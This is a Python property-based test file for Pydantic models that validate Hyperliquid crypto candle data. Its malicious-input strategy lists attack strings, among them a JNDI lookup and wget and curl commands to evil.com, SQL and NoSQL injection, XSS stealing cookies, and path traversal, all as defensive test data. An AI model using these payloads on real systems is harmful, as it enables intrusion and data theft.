"""Property-based tests for Hyperliquid raw candle models.

These tests validate critical security boundary models that process external candle data.
The models tested here are essential for historical price series, OHLCV data, and market analysis.

SECURITY CRITICAL: These raw models protect against:
- Malicious candle data that could manipulate price charts and technical indicators
- Financial precision errors in OHLCV calculations for trading decisions
- Buffer overflow attacks through oversized candle arrays
- Injection attacks through malformed candle data
- Price manipulation through invalid OHLCV values
- Volume manipulation that could affect liquidity analysis

Property testing ensures comprehensive coverage of candle edge cases and adversarial inputs.
"""

import json
from decimal import Decimal
from typing import Any

import pytest
from hypothesis import assume, given, strategies as st
from hypothesis.strategies import SearchStrategy
from pydantic import ValidationError

from cyberdelta.apis.exceptions.parsing import ParsingError, StructureTypeError
from cyberdelta.apis.hyperliquid.models.hl_raw_candles import (
    HyperliquidRawCandleRequestDetails,
    HyperliquidRawCandleSnapshot,
    HyperliquidRawCandleSnapshotRequestPayload,
    HyperliquidRawWsCandle,
)
from cyberdelta.exceptions.field_validation import TypeFieldError
from cyberdelta.exceptions.parsing import EmptyStringError


# =============================================================================
# HYPOTHESIS STRATEGIES FOR CANDLE MODEL TESTING
# =============================================================================


def coin_strategy() -> SearchStrategy[str]:
    """Generate valid coin/asset strings for candles."""
    return st.one_of([
        # Common cryptocurrencies
        st.sampled_from([
            "BTC",
            "ETH",
            "SOL",
            "USDC",
            "USDT",
            "AVAX",
            "ATOM",
            "DOT",
            "LINK",
            "UNI",
            "MATIC",
            "ADA",
            "XRP",
            "DOGE",
            "SHIB",
            "FTM",
            "NEAR",
            "ALGO",
            "MANA",
            "SAND",
        ]),
        # Generated asset names
        st.text(
            min_size=1,
            max_size=24,
            alphabet=st.characters(
                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="-_"
            ),
        ).filter(lambda x: x.strip() and len(x.encode("utf-8")) <= 48),
    ])


def interval_strategy() -> SearchStrategy[str]:
    """Generate valid candle interval strings."""
    return st.sampled_from([
        "1m",  # 1 minute
        "3m",  # 3 minutes
        "5m",  # 5 minutes
        "15m",  # 15 minutes
        "30m",  # 30 minutes
        "1h",  # 1 hour
        "2h",  # 2 hours
        "4h",  # 4 hours
        "6h",  # 6 hours
        "8h",  # 8 hours
        "12h",  # 12 hours
        "1d",  # 1 day
        "3d",  # 3 days
        "1w",  # 1 week
        "1M",  # 1 month
    ])


def timestamp_ms_strategy() -> SearchStrategy[int]:
    """Generate valid millisecond timestamps."""
    return st.one_of([
        # Valid timestamp ranges (in milliseconds)
        st.integers(min_value=0, max_value=2**53 - 1),  # JavaScript safe integer
        st.integers(min_value=1640995200000, max_value=2147483647000),  # 2022-2038
        # Common values
        st.just(0),  # Zero timestamp
        st.just(1700000000000),  # Recent timestamp
        st.just(1641886630493),  # Sample MS timestamp
    ])


def ohlcv_decimal_strategy() -> SearchStrategy[str]:
    """Generate decimal strings for OHLCV values."""
    return st.one_of([
        # Common price values
        st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal(1000000), places=8).map(str),
        st.decimals(min_value=Decimal("0.01"), max_value=Decimal(100000), places=6).map(str),
        # Common values
        st.just("0.01"),  # Small price
        st.just("1.0"),  # Unit price
        st.just("100.0"),  # Standard price
        st.just("1234.56"),  # Common price format
        st.just("50000.123456"),  # High-precision price
        st.just("0.00000001"),  # Minimum precision
        # Scientific notation (valid for decimal parsing)
        st.just("1e2"),
        st.just("1.5e3"),
        st.just("2.5e-4"),
    ])


def volume_decimal_strategy() -> SearchStrategy[str]:
    """Generate decimal strings for volume (positive only)."""
    return st.one_of([
        # Common volume values
        st.decimals(min_value=Decimal(0), max_value=Decimal(1000000000), places=8).map(str),
        st.decimals(min_value=Decimal("0.01"), max_value=Decimal(10000000), places=6).map(str),
        # Common values
        st.just("0"),  # Zero volume
        st.just("0.01"),  # Small volume
        st.just("1.0"),  # Unit volume
        st.just("100.0"),  # Standard volume
        st.just("1000000.123456"),  # High volume
        # Scientific notation
        st.just("1e6"),
        st.just("1.5e3"),
    ])


def status_string_strategy() -> SearchStrategy[str]:
    """Generate valid status strings."""
    return st.sampled_from([
        "ok",
        "OK",
        "success",
        "completed",
        "done",
        "partial",
        "error",
        "no_data",
    ])


@st.composite
def valid_candle_snapshot_data(draw: st.DrawFn, num_candles: int | None = None) -> dict[str, Any]:
    """Generate valid candle snapshot data."""
    if num_candles is None:
        num_candles = draw(st.integers(min_value=0, max_value=100))

    timestamps = sorted([draw(timestamp_ms_strategy()) for _ in range(num_candles)])
    opens = [draw(ohlcv_decimal_strategy()) for _ in range(num_candles)]
    highs = [draw(ohlcv_decimal_strategy()) for _ in range(num_candles)]
    lows = [draw(ohlcv_decimal_strategy()) for _ in range(num_candles)]
    closes = [draw(ohlcv_decimal_strategy()) for _ in range(num_candles)]
    volumes = [draw(volume_decimal_strategy()) for _ in range(num_candles)]

    return {
        "t": timestamps,
        "o": opens,
        "h": highs,
        "l": lows,
        "c": closes,
        "v": volumes,
        "s": draw(status_string_strategy()),
    }


@st.composite
def valid_candle_request_details_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid candle request details data."""
    start_time = draw(timestamp_ms_strategy())
    end_time = draw(
        st.integers(min_value=start_time, max_value=start_time + 86400000 * 30)
    )  # Max 30 days

    return {
        "coin": draw(coin_strategy()),
        "interval": draw(interval_strategy()),
        "startTime": start_time,
        "endTime": end_time,
    }


@st.composite
def valid_ws_candle_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid WebSocket candle data."""
    timestamp = draw(timestamp_ms_strategy())

    return {
        "t": timestamp,
        "T": timestamp
        + draw(st.integers(min_value=0, max_value=86400000)),  # Close time after open
        "s": draw(coin_strategy()),
        "i": draw(interval_strategy()),
        "o": draw(ohlcv_decimal_strategy()),
        "c": draw(ohlcv_decimal_strategy()),
        "h": draw(ohlcv_decimal_strategy()),
        "l": draw(ohlcv_decimal_strategy()),
        "v": draw(volume_decimal_strategy()),
        "n": draw(st.integers(min_value=0, max_value=100000)),
    }


def malicious_candle_strategy() -> SearchStrategy[Any]:
    """Generate malicious values for candle security testing."""
    return st.one_of([
        # Candle manipulation attempts
        st.just("${jndi:ldap://evil.com/steal-candles}"),
        st.just("999999999999999999999999999999.99"),  # Overflow attempt
        st.just("../../etc/passwd"),  # Path traversal
        # XSS attempts
        st.just("<script>alert('candle-xss')</script>"),
        st.just("<img src=x onerror=alert(document.cookie)>"),
        # SQL injection attempts
        st.just("'; DROP TABLE candles;--"),
        st.just("1' UNION SELECT * FROM prices--"),
        # Buffer overflow attempts
        st.text(min_size=1000, max_size=1500),
        st.just("C" * 10000),
        # Unicode attacks
        st.just("\udce2\udc28\udc00"),  # Lone surrogates
        st.just("\x00\x01\x02"),  # Control characters
        # Format string attacks
        st.just("%s%s%s%s%n"),
        st.just("%x%x%x%x"),
        # Command injection
        st.just("; wget evil.com/backdoor"),
        st.just("`curl evil.com/exfiltrate`"),
        # NoSQL injection
        st.just("'; return db.candles.find(); //"),
        # JSON injection
        st.just('{"$where": "this.price > 1000000"}'),
        # Price manipulation
        st.just("1000.0'; UPDATE prices SET price=0;--"),
        # Type confusion
        st.none(),
        st.integers(),
        st.floats(),
        st.booleans(),
        st.lists(st.text()),
        st.dictionaries(st.text(), st.text()),
        st.binary(),
    ])


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW CANDLE SNAPSHOT MODEL
# =============================================================================


class TestHyperliquidRawCandleSnapshotProperties:
    """Property-based tests for HyperliquidRawCandleSnapshot validation and security."""

    @given(candle_data=valid_candle_snapshot_data())
    def test_candle_snapshot_validation_success_properties(
        self, candle_data: dict[str, Any]
    ) -> None:
        """Property: Valid candle snapshot data should always create valid HyperliquidRawCandleSnapshot objects."""
        # Skip invalid data
        try:
            # Validate all fields
            assume(isinstance(candle_data["s"], str) and candle_data["s"].strip())
            assume(len(candle_data["s"].encode("utf-8")) <= 32)

            # Validate lists have same length
            list_len = len(candle_data["t"])
            for field in ["o", "h", "l", "c", "v"]:
                assume(len(candle_data[field]) == list_len)

            # Validate decimal strings
            for field in ["o", "h", "l", "c", "v"]:
                for value in candle_data[field]:
                    assume(isinstance(value, str) and value.strip())
                    decimal_val = Decimal(value)
                    assume(decimal_val.is_finite())
                    if field == "v":
                        assume(decimal_val >= 0)

        except (ValueError, TypeError, KeyError):
            assume(False)

        obj = HyperliquidRawCandleSnapshot.model_validate(candle_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawCandleSnapshot)

        # Property: All fields should be preserved with correct types
        assert len(obj.t) == len(candle_data["t"])
        assert len(obj.o) == len(candle_data["o"])
        assert len(obj.h) == len(candle_data["h"])
        assert len(obj.l) == len(candle_data["l"])
        assert len(obj.c) == len(candle_data["c"])
        assert len(obj.v) == len(candle_data["v"])
        assert obj.s == candle_data["s"]

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("populate_by_name") is True
        assert obj.model_config.get("frozen") is True

    @given(
        field_name=st.sampled_from(["t", "o", "h", "l", "c", "v", "s"]),
        malicious_value=malicious_candle_strategy(),
    )
    def test_candle_snapshot_security_boundary_properties(
        self, field_name: str, malicious_value: Any
    ) -> None:
        """Property: Candle snapshot model should reject malicious inputs safely."""
        base_data = {
            "t": [1700000000000],
            "o": ["100.0"],
            "h": ["101.0"],
            "l": ["99.0"],
            "c": ["100.5"],
            "v": ["1000.0"],
            "s": "ok",
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((
            ValidationError,
            TypeError,
            EmptyStringError,
            TypeFieldError,
            ParsingError,
            StructureTypeError,
        )):
            HyperliquidRawCandleSnapshot.model_validate(base_data)

    @given(
        num_candles=st.integers(min_value=1, max_value=10),
        mismatched_field=st.sampled_from(["o", "h", "l", "c", "v"]),
        mismatch_delta=st.integers(min_value=1, max_value=5),
    )
    def test_candle_snapshot_list_length_validation_properties(
        self, num_candles: int, mismatched_field: str, mismatch_delta: int
    ) -> None:
        """Property: All OHLCV lists must have the same length as timestamp list."""
        candle_data = {
            "t": list(range(num_candles)),
            "o": ["100.0"] * num_candles,
            "h": ["101.0"] * num_candles,
            "l": ["99.0"] * num_candles,
            "c": ["100.5"] * num_candles,
            "v": ["1000.0"] * num_candles,
            "s": "ok",
        }

        # Create mismatch
        current_list = candle_data[mismatched_field]
        if isinstance(current_list, list):
            if num_candles > mismatch_delta:
                candle_data[mismatched_field] = current_list[:-mismatch_delta]
            else:
                candle_data[mismatched_field] = current_list + ["100.0"] * mismatch_delta

        # Property: Mismatched lengths should be rejected
        with pytest.raises(ParsingError) as exc_info:
            HyperliquidRawCandleSnapshot.model_validate(candle_data)
        assert "must all have the same length" in str(exc_info.value)

    @given(
        field_name=st.sampled_from(["o", "h", "l", "c", "v"]),
        decimal_value=st.one_of([
            # Invalid decimals
            st.just("NaN"),
            st.just("inf"),
            st.just("-inf"),
            st.just("Infinity"),
            st.just("-Infinity"),
            st.just(""),
            st.just("   "),
            st.just("not_a_number"),
            st.just("1..0"),
            # Negative volumes (invalid for v field)
            st.just("-100.0"),
            st.just("-0.01"),
        ]),
    )
    def test_candle_snapshot_decimal_validation_properties(
        self, field_name: str, decimal_value: str
    ) -> None:
        """Property: OHLCV decimal fields should validate properly."""
        candle_data = {
            "t": [1700000000000],
            "o": ["100.0"],
            "h": ["101.0"],
            "l": ["99.0"],
            "c": ["100.5"],
            "v": ["1000.0"],
            "s": "ok",
        }
        candle_data[field_name] = [decimal_value]

        try:
            # Check if the value can be parsed as a finite decimal
            decimal_val = Decimal(decimal_value.strip() if decimal_value else "")
            is_finite = decimal_val.is_finite()
            is_empty = not decimal_value.strip()
            is_negative = decimal_val < 0

            if is_finite and not is_empty:
                # For volume field, also check non-negative constraint
                if field_name == "v" and is_negative:
                    # Property: Negative volumes should be rejected
                    with pytest.raises(ValidationError):
                        HyperliquidRawCandleSnapshot.model_validate(candle_data)
                else:
                    # Property: Valid finite decimals should be accepted
                    obj = HyperliquidRawCandleSnapshot.model_validate(candle_data)
                    assert len(getattr(obj, field_name)) == 1
            else:
                # Property: Non-finite or empty values should be rejected
                with pytest.raises((ValidationError, EmptyStringError, ParsingError)):
                    HyperliquidRawCandleSnapshot.model_validate(candle_data)

        except (ValueError, TypeError):
            # Property: Unparseable decimal strings should be rejected
            with pytest.raises((ValidationError, ParsingError)):
                HyperliquidRawCandleSnapshot.model_validate(candle_data)

    def test_candle_snapshot_empty_list_preprocessing_properties(self) -> None:
        """Property: Empty list response should be preprocessed to empty candle structure."""
        # Property: Empty list should create empty candle structure
        obj = HyperliquidRawCandleSnapshot.model_validate([])
        assert obj.t == []
        assert obj.o == []
        assert obj.h == []
        assert obj.l == []
        assert obj.c == []
        assert obj.v == []
        assert obj.s == "ok"

    @given(candle_data=valid_candle_snapshot_data())
    def test_candle_snapshot_extra_fields_properties(self, candle_data: dict[str, Any]) -> None:
        """Property: Candle snapshot model should forbid extra fields."""
        # Skip invalid data
        try:
            assume(isinstance(candle_data["s"], str) and candle_data["s"].strip())
            list_len = len(candle_data["t"])
            for field in ["o", "h", "l", "c", "v"]:
                assume(len(candle_data[field]) == list_len)
        except (TypeError, KeyError):
            assume(False)

        # Add extra fields
        candle_data_with_extra = candle_data.copy()
        candle_data_with_extra["extra"] = "forbidden"
        candle_data_with_extra["volume_usd"] = 1000000

        # Property: Extra fields should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawCandleSnapshot.model_validate(candle_data_with_extra)


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW CANDLE REQUEST MODELS
# =============================================================================


class TestHyperliquidRawCandleRequestProperties:
    """Property-based tests for candle request models validation and security."""

    @given(request_details=valid_candle_request_details_data())
    def test_candle_request_details_validation_success_properties(
        self, request_details: dict[str, Any]
    ) -> None:
        """Property: Valid candle request details should always create valid HyperliquidRawCandleRequestDetails objects."""
        # Skip invalid data
        try:
            assume(isinstance(request_details["coin"], str) and request_details["coin"].strip())
            assume(len(request_details["coin"]) <= 24)
            assume(
                isinstance(request_details["interval"], str) and request_details["interval"].strip()
            )
            assume(len(request_details["interval"]) <= 8)
            assume(
                isinstance(request_details["startTime"], int) and request_details["startTime"] >= 0
            )
            assume(isinstance(request_details["endTime"], int) and request_details["endTime"] >= 0)
        except (TypeError, KeyError):
            assume(False)

        obj = HyperliquidRawCandleRequestDetails.model_validate(request_details)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawCandleRequestDetails)
        assert obj.coin == request_details["coin"]
        assert obj.interval == request_details["interval"]
        assert obj.start_time == request_details["startTime"]
        assert obj.end_time == request_details["endTime"]

    @given(request_details=valid_candle_request_details_data())
    def test_candle_snapshot_request_payload_validation_success_properties(
        self, request_details: dict[str, Any]
    ) -> None:
        """Property: Valid candle snapshot request should always create valid HyperliquidRawCandleSnapshotRequestPayload objects."""
        # Skip invalid data
        try:
            assume(isinstance(request_details["coin"], str) and request_details["coin"].strip())
            assume(len(request_details["coin"]) <= 24)
            assume(
                isinstance(request_details["interval"], str) and request_details["interval"].strip()
            )
            assume(len(request_details["interval"]) <= 8)
        except (TypeError, KeyError):
            assume(False)

        req_obj = HyperliquidRawCandleRequestDetails.model_validate(request_details)

        payload_data = {
            "type": "candleSnapshot",
            "req": request_details,
        }

        obj = HyperliquidRawCandleSnapshotRequestPayload.model_validate(payload_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawCandleSnapshotRequestPayload)
        assert obj.type == "candleSnapshot"
        assert obj.req.coin == request_details["coin"]
        assert obj.req.interval == request_details["interval"]

    @given(
        request_type=st.one_of([
            st.just("candleSnapshot"),
            st.just("candle"),
            st.just("snapshot"),
            st.just("candlesnapshot"),
            st.just("CandleSnapshot"),
            st.just("invalid"),
            st.just(""),
        ])
    )
    def test_candle_request_type_validation_properties(self, request_type: str) -> None:
        """Property: Candle request type field should validate against literal value."""
        request_data = {
            "type": request_type,
            "req": {
                "coin": "BTC",
                "interval": "1h",
                "startTime": 1700000000000,
                "endTime": 1700086400000,
            },
        }

        if request_type == "candleSnapshot":
            # Property: Valid type should be accepted
            obj = HyperliquidRawCandleSnapshotRequestPayload.model_validate(request_data)
            assert obj.type == "candleSnapshot"
        else:
            # Property: Invalid types should be rejected
            with pytest.raises(ValidationError):
                HyperliquidRawCandleSnapshotRequestPayload.model_validate(request_data)


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW WEBSOCKET CANDLE MODEL
# =============================================================================


class TestHyperliquidRawWsCandleProperties:
    """Property-based tests for WebSocket candle validation and security."""

    @given(ws_candle_data=valid_ws_candle_data())
    def test_ws_candle_validation_success_properties(self, ws_candle_data: dict[str, Any]) -> None:
        """Property: Valid WebSocket candle data should always create valid HyperliquidRawWsCandle objects."""
        # Skip invalid data
        try:
            # Validate string fields
            for field in ["s", "i"]:
                value = ws_candle_data[field]
                assume(isinstance(value, str) and value.strip())
            assume(len(ws_candle_data["s"]) <= 24)
            assume(len(ws_candle_data["i"]) <= 8)

            # Validate timestamps
            for field in ["t", "T"]:
                assume(isinstance(ws_candle_data[field], int) and ws_candle_data[field] >= 0)

            # Validate decimal strings
            for field in ["o", "c", "h", "l", "v"]:
                value = ws_candle_data[field]
                assume(isinstance(value, str) and value.strip())
                decimal_val = Decimal(value)
                assume(decimal_val.is_finite())
                if field == "v":
                    assume(decimal_val >= 0)

            # Validate trade count
            assume(isinstance(ws_candle_data["n"], int) and ws_candle_data["n"] >= 0)

        except (ValueError, TypeError, KeyError):
            assume(False)

        obj = HyperliquidRawWsCandle.model_validate(ws_candle_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawWsCandle)

        # Property: All fields should be preserved with correct types
        assert obj.t == ws_candle_data["t"]
        assert ws_candle_data["T"] == obj.T
        assert obj.s == ws_candle_data["s"]
        assert obj.i == ws_candle_data["i"]
        assert isinstance(obj.o, str)
        assert isinstance(obj.c, str)
        assert isinstance(obj.h, str)
        assert isinstance(obj.l, str)
        assert isinstance(obj.v, str)
        assert obj.n == ws_candle_data["n"]

    @given(
        field_name=st.sampled_from(["t", "T", "s", "i", "o", "c", "h", "l", "v", "n"]),
        malicious_value=malicious_candle_strategy(),
    )
    def test_ws_candle_security_boundary_properties(
        self, field_name: str, malicious_value: Any
    ) -> None:
        """Property: WebSocket candle model should reject malicious inputs safely."""
        base_data = {
            "t": 1700000000000,
            "T": 1700000060000,
            "s": "SOL",
            "i": "1m",
            "o": "164.12",
            "c": "164.12",
            "h": "164.12",
            "l": "164.12",
            "v": "36.5",
            "n": 1,
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((
            ValidationError,
            TypeError,
            EmptyStringError,
            TypeFieldError,
            ParsingError,
        )):
            HyperliquidRawWsCandle.model_validate(base_data)

    @given(ws_candle_data=valid_ws_candle_data())
    def test_ws_candle_extra_fields_properties(self, ws_candle_data: dict[str, Any]) -> None:
        """Property: WebSocket candle model should forbid extra fields."""
        # Skip invalid data
        try:
            assume(isinstance(ws_candle_data["s"], str) and ws_candle_data["s"].strip())
            assume(isinstance(ws_candle_data["i"], str) and ws_candle_data["i"].strip())
        except (TypeError, KeyError):
            assume(False)

        # Add extra fields
        ws_candle_data_with_extra = ws_candle_data.copy()
        ws_candle_data_with_extra["extra"] = "forbidden"
        ws_candle_data_with_extra["channel"] = "candle"

        # Property: Extra fields should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawWsCandle.model_validate(ws_candle_data_with_extra)


# =============================================================================
# INTEGRATION TESTS WITH MIXED PROPERTY SCENARIOS
# =============================================================================


class TestHyperliquidRawCandleIntegrationProperties:
    """Integration property tests for candle models working together."""

    @given(
        candle_snapshot=valid_candle_snapshot_data(num_candles=5),
        ws_candle=valid_ws_candle_data(),
    )
    def test_candle_models_integration_properties(
        self, candle_snapshot: dict[str, Any], ws_candle: dict[str, Any]
    ) -> None:
        """Property: Different candle models should work consistently together."""
        # Skip invalid data
        try:
            # Validate snapshot
            assume(isinstance(candle_snapshot["s"], str) and candle_snapshot["s"].strip())
            list_len = len(candle_snapshot["t"])
            for field in ["o", "h", "l", "c", "v"]:
                assume(len(candle_snapshot[field]) == list_len)

            # Validate ws candle
            assume(isinstance(ws_candle["s"], str) and ws_candle["s"].strip())
            assume(isinstance(ws_candle["i"], str) and ws_candle["i"].strip())

        except (TypeError, KeyError):
            assume(False)

        # Property: Both models should validate successfully
        snapshot_obj = HyperliquidRawCandleSnapshot.model_validate(candle_snapshot)
        ws_obj = HyperliquidRawWsCandle.model_validate(ws_candle)

        assert isinstance(snapshot_obj, HyperliquidRawCandleSnapshot)
        assert isinstance(ws_obj, HyperliquidRawWsCandle)

        # Property: Both should be frozen
        assert snapshot_obj.model_config.get("frozen") is True
        assert ws_obj.model_config.get("frozen") is True

    @given(
        complete_malicious_data=st.dictionaries(
            st.sampled_from(["t", "o", "h", "l", "c", "v", "s"]),
            malicious_candle_strategy(),
            min_size=3,
            max_size=7,
        )
    )
    def test_candle_models_adversarial_input_properties(
        self, complete_malicious_data: dict[str, Any]
    ) -> None:
        """Property: All candle models should safely handle complete adversarial input."""
        # Property: Complete adversarial input should be safely rejected
        with pytest.raises((ValidationError, TypeError, StructureTypeError, ParsingError)):
            HyperliquidRawCandleSnapshot.model_validate(complete_malicious_data)

    @given(candle_data=valid_candle_snapshot_data(), ws_data=valid_ws_candle_data())
    def test_candle_json_serialization_properties(
        self, candle_data: dict[str, Any], ws_data: dict[str, Any]
    ) -> None:
        """Property: Candle models should maintain JSON serialization compatibility."""
        # Skip invalid data
        try:
            # Validate snapshot data
            assume(isinstance(candle_data["s"], str) and candle_data["s"].strip())
            list_len = len(candle_data["t"])
            for field in ["o", "h", "l", "c", "v"]:
                assume(len(candle_data[field]) == list_len)
                for value in candle_data[field]:
                    decimal_val = Decimal(value)
                    assume(decimal_val.is_finite())
                    if field == "v":
                        assume(decimal_val >= 0)

            # Validate ws data
            assume(isinstance(ws_data["s"], str) and ws_data["s"].strip())
            assume(isinstance(ws_data["i"], str) and ws_data["i"].strip())

        except (ValueError, TypeError, KeyError):
            assume(False)

        # Test snapshot serialization
        snapshot_obj = HyperliquidRawCandleSnapshot.model_validate(candle_data)
        snapshot_json = snapshot_obj.model_dump_json()
        snapshot_parsed = json.loads(snapshot_json)
        snapshot_reconstructed = HyperliquidRawCandleSnapshot.model_validate(snapshot_parsed)
        assert len(snapshot_reconstructed.t) == len(snapshot_obj.t)
        assert snapshot_reconstructed.s == snapshot_obj.s

        # Test WebSocket candle serialization
        ws_obj = HyperliquidRawWsCandle.model_validate(ws_data)
        ws_json = ws_obj.model_dump_json()
        ws_parsed = json.loads(ws_json)
        ws_reconstructed = HyperliquidRawWsCandle.model_validate(ws_parsed)
        assert ws_reconstructed.t == ws_obj.t
        assert ws_reconstructed.s == ws_obj.s


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_HyperliquidRawCandleSnapshot_real_world_example() -> None:
    """Test with real-world candle snapshot data."""
    payload = {
        "t": [1700000000000, 1700000060000],
        "o": ["100.0", "100.5"],
        "h": ["101.0", "102.0"],
        "l": ["99.0", "100.0"],
        "c": ["100.5", "101.5"],
        "v": ["1000.0", "1200.0"],
        "s": "ok",
    }
    obj = HyperliquidRawCandleSnapshot.model_validate(payload)
    assert len(obj.t) == 2
    assert obj.s == "ok"
    # Decimal normalization may occur
    assert obj.o[0] in ["100", "100.0"]
    assert obj.c[1] == "101.5"


def test_HyperliquidRawCandleSnapshot_empty_candles() -> None:
    """Test with empty candle data."""
    payload = {
        "t": [],
        "o": [],
        "h": [],
        "l": [],
        "c": [],
        "v": [],
        "s": "ok",
    }
    obj = HyperliquidRawCandleSnapshot.model_validate(payload)
    assert obj.t == []
    assert obj.o == []
    assert obj.v == []
    assert obj.s == "ok"


def test_HyperliquidRawCandleSnapshot_single_candle() -> None:
    """Test with single candle data."""
    payload = {
        "t": [1700000000000],
        "o": ["100.0"],
        "h": ["101.0"],
        "l": ["99.0"],
        "c": ["100.5"],
        "v": ["1000.0"],
        "s": "ok",
    }
    obj = HyperliquidRawCandleSnapshot.model_validate(payload)
    assert len(obj.t) == 1
    assert obj.t[0] == 1700000000000
    assert obj.h[0] in ["101", "101.0"]
    assert obj.l[0] in ["99", "99.0"]


def test_HyperliquidRawCandleSnapshot_high_precision() -> None:
    """Test with high-precision decimal values."""
    payload = {
        "t": [1700000000000],
        "o": ["123.12345678"],
        "h": ["124.87654321"],
        "l": ["122.00000001"],
        "c": ["123.45678900"],
        "v": ["0.00000001"],
        "s": "ok",
    }
    obj = HyperliquidRawCandleSnapshot.model_validate(payload)
    assert obj.o[0] == "123.12345678"
    assert obj.v[0] == "0.00000001"


def test_HyperliquidRawCandleSnapshot_scientific_notation() -> None:
    """Test with scientific notation in decimal fields."""
    payload = {
        "t": [1700000000000],
        "o": ["1e2"],  # 100
        "h": ["1.01e2"],  # 101
        "l": ["9.9e1"],  # 99
        "c": ["1.005e2"],  # 100.5
        "v": ["1e3"],  # 1000
        "s": "ok",
    }
    obj = HyperliquidRawCandleSnapshot.model_validate(payload)
    # Scientific notation should be normalized
    assert obj.o[0] in ["100", "1E+2"]
    assert obj.v[0] in ["1000", "1E+3"]


def test_HyperliquidRawCandleSnapshot_empty_list_preprocessing() -> None:
    """Test preprocessing of empty list response."""
    # Empty list should be preprocessed to valid empty structure
    obj = HyperliquidRawCandleSnapshot.model_validate([])
    assert obj.t == []
    assert obj.o == []
    assert obj.h == []
    assert obj.l == []
    assert obj.c == []
    assert obj.v == []
    assert obj.s == "ok"


def test_HyperliquidRawCandleRequestDetails_real_world_example() -> None:
    """Test with real-world candle request details."""
    payload = {
        "coin": "BTC",
        "interval": "1h",
        "startTime": 1700000000000,
        "endTime": 1700086400000,
    }
    obj = HyperliquidRawCandleRequestDetails.model_validate(payload)
    assert obj.coin == "BTC"
    assert obj.interval == "1h"
    assert obj.start_time == 1700000000000
    assert obj.end_time == 1700086400000


def test_HyperliquidRawCandleSnapshotRequestPayload_real_world_example() -> None:
    """Test with real-world candle snapshot request payload."""
    payload = {
        "type": "candleSnapshot",
        "req": {
            "coin": "ETH",
            "interval": "5m",
            "startTime": 1700000000000,
            "endTime": 1700003600000,
        },
    }
    obj = HyperliquidRawCandleSnapshotRequestPayload.model_validate(payload)
    assert obj.type == "candleSnapshot"
    assert obj.req.coin == "ETH"
    assert obj.req.interval == "5m"


def test_HyperliquidRawWsCandle_real_world_example() -> None:
    """Test with real-world WebSocket candle data."""
    payload = {
        "t": 1752198900000,
        "T": 1752198960000,
        "s": "SOL",
        "i": "1m",
        "o": "164.12",
        "c": "164.12",
        "h": "164.12",
        "l": "164.12",
        "v": "36.5",
        "n": 1,
    }
    obj = HyperliquidRawWsCandle.model_validate(payload)
    assert obj.t == 1752198900000
    assert obj.T == 1752198960000
    assert obj.s == "SOL"
    assert obj.i == "1m"
    assert obj.o == "164.12"
    assert obj.c == "164.12"
    assert obj.h == "164.12"
    assert obj.l == "164.12"
    assert obj.v == "36.5"
    assert obj.n == 1


def test_HyperliquidRawWsCandle_zero_trades() -> None:
    """Test WebSocket candle with zero trades."""
    payload = {
        "t": 1700000000000,
        "T": 1700000060000,
        "s": "BTC",
        "i": "1m",
        "o": "50000.0",
        "c": "50000.0",
        "h": "50000.0",
        "l": "50000.0",
        "v": "0",
        "n": 0,
    }
    obj = HyperliquidRawWsCandle.model_validate(payload)
    assert obj.v == "0"
    assert obj.n == 0


def test_HyperliquidRawWsCandle_high_volume() -> None:
    """Test WebSocket candle with high volume."""
    payload = {
        "t": 1700000000000,
        "T": 1700000060000,
        "s": "ETH",
        "i": "1h",
        "o": "2000.0",
        "c": "2100.0",
        "h": "2150.0",
        "l": "1990.0",
        "v": "1000000.123456",
        "n": 50000,
    }
    obj = HyperliquidRawWsCandle.model_validate(payload)
    assert obj.v == "1000000.123456"
    assert obj.n == 50000


def test_HyperliquidRawCandleSnapshot_mismatched_lengths() -> None:
    """Test validation fails for mismatched list lengths."""
    payload = {
        "t": [1700000000000, 1700000060000],
        "o": ["100.0"],  # Only 1 element instead of 2
        "h": ["101.0", "102.0"],
        "l": ["99.0", "100.0"],
        "c": ["100.5", "101.5"],
        "v": ["1000.0", "1200.0"],
        "s": "ok",
    }
    with pytest.raises(ParsingError) as exc_info:
        HyperliquidRawCandleSnapshot.model_validate(payload)
    assert "must all have the same length" in str(exc_info.value)


def test_HyperliquidRawCandleSnapshot_negative_volume() -> None:
    """Test validation fails for negative volume."""
    payload = {
        "t": [1700000000000],
        "o": ["100.0"],
        "h": ["101.0"],
        "l": ["99.0"],
        "c": ["100.5"],
        "v": ["-10.0"],  # Negative volume
        "s": "ok",
    }
    with pytest.raises(ValidationError) as exc_info:
        HyperliquidRawCandleSnapshot.model_validate(payload)
    assert "-10" in str(exc_info.value).lower()
    assert "non-negative" in str(exc_info.value).lower()


def test_HyperliquidRawCandleSnapshot_invalid_decimal() -> None:
    """Test validation fails for invalid decimal strings."""
    payload = {
        "t": [1700000000000],
        "o": ["not_a_number"],
        "h": ["101.0"],
        "l": ["99.0"],
        "c": ["100.5"],
        "v": ["1000.0"],
        "s": "ok",
    }
    with pytest.raises(ValidationError) as exc_info:
        HyperliquidRawCandleSnapshot.model_validate(payload)
    assert "not_a_number" in str(exc_info.value).lower()


def test_HyperliquidRawCandleSnapshot_infinity_price() -> None:
    """Test validation fails for infinity in price fields."""
    payload = {
        "t": [1700000000000],
        "o": ["Infinity"],
        "h": ["101.0"],
        "l": ["99.0"],
        "c": ["100.5"],
        "v": ["1000.0"],
        "s": "ok",
    }
    with pytest.raises(ValidationError) as exc_info:
        HyperliquidRawCandleSnapshot.model_validate(payload)
    assert "infinity" in str(exc_info.value).lower()
    assert "finite" in str(exc_info.value).lower()


